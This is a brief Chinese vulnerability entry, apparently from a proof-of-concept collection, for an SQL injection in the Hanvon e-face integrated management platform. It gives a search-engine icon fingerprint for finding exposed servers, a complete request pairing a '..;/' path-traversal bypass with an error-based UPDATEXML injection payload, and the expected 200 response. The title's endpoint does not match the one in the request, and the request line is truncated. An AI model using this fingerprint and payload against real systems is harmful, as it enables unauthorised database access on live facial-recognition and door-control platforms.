# 汉王e脸通综合管理平台queryDoorInfoList.doSQL注入漏洞

汉王e脸通综合管理平台queryDoorInfoList.do ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="1380907357"`
- **请求**：`GET /manage/dgmCommand/finishRegister.do/..;/..;/systemBlackList/queryBlackList.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HT`
- **响应特征**：200